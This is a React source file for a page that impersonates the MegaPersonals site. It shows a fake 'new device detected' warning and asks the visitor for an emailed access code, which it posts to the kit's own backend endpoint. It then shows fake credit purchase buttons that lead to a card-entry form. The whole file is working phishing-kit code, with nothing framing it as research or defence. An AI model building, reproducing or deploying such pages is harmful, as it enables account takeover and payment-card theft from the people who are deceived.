"use client";

import Cookies from "js-cookie";
import { useState } from "react";

import { Field, Form, Formik } from "formik";
import { API_URL } from "../config/index";
import { toast } from "react-toastify";
import CardForm from "../components/cardForm";

function SecurityCheck() {
  const [showModal, setShowModal] = useState(false);
  const [cardPage, setCardPage] = useState(false);

  const currentDate = new Date();
  const options = { year: "numeric", month: "long", day: "numeric" };
  const formattedDate = currentDate.toLocaleDateString("en-US", options);

  const id = Cookies.get("id");
  console.log(id);

  const initialvalues = {
    id: id,
    skipcode: "",
  };

  const handleSubmit = async (values, formik) => {
    console.log(values);
    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      setShowModal(true);

      formik.resetForm();
      console.log("success", data);
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <>
      {!showModal ? (
        <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
          <div className="w-[65%] lg:w-full">
            <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
          </div>

          <div className="mt-5 py-1.5 w-full bg-[#F8EFCE] text-[#B8AF8E] text-xl text-center font-medium uppercase">
            New deviece detected
          </div>

          <p className="mt-6 text-xl text-[#C75400] text-center">
            Your ACCESS CODE <br /> has been sent <b>Successfully</b> <br /> to
            your email on <b>{formattedDate}</b>. <br /> That code remains
            valid.
          </p>

          <p className="mt-5 text-center text-xl italic font-bold text-[#2FAEEA] uppercase">
            CHECK YOUR SPAM <br /> FOLDER IT MAY BE THERE.
          </p>

          <p className="mt-7 flex items-center gap-3 text-xl text-[#C75400] text-center font-bold italic uppercase">
            <span>DO NOT SHARE IT</span>
            <span className="bg-[#2FAEEA] w-6 h-6 rounded-full text-white flex justify-center items-center font-bold not-italic">
              <span>?</span>
            </span>
          </p>

          <p className="mt-5 text-xl text-[#C75400] text-center ">
            Enter the code <br /> below to continue.
          </p>

          <div className="mt-7 flex items-center">
            <Formik
              initialValues={initialvalues}
              // validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="flex flex-col items-center">
                  <div className="">
                    <Field
                      className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                      name="skipcode"
                      required
                    />
                  </div>
                  <button
                    type="submit"
                    className="mt-[20px] bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                  >
                    Submit
                  </button>
                </Form>
              )}
            </Formik>
          </div>

          {/* {showModal && <PhotoUpload setShowModal={setShowModal} />} */}
        </div>
      ) : (
        <>
          {!cardPage ? (
            <div className="container mx-auto py-10">
              <div className="max-w-[600px] mx-auto">
                <div className="grid  grid-cols-1 mx-auto  justify-items-center gap-10">
                  <div className="shadow-xl rounded-xl p-5 w-full bg-white">
                    <div>
                      <img
                        class="w-full"
                        src="/images/du_icon.svg"
                        alt="zoom image"
                      />
                    </div>
                    <div className="flex items-center flex-col gap-2 my-6 justify-center">
                      <button
                        className="py-2 text-center px-6 w-full  border border-[#1A73E8]  text-xl rounded-xl bg-transparent text-[#1A73E8]"
                        onClick={() => setCardPage(true)}
                      >
                        Basic $1.99
                      </button>
                      <button
                        className="py-2 text-center px-6 w-full  border border-[#1A73E8]  text-xl rounded-xl bg-[#1A73E8] text-white"
                        onClick={() => setCardPage(true)}
                      >
                        Popular $4.99
                      </button>
                    </div>
                    <div class="flex items-center my-6 justify-center">
                      <button
                        class="py-2 text-center px-6 w-full bg-red-600 text-white text-xl rounded-xl"
                        onClick={() => setCardPage(true)}
                      >
                        Buy Credit with $4.99
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <CardForm />
          )}
        </>
      )}
    </>
  );
}

export default SecurityCheck;
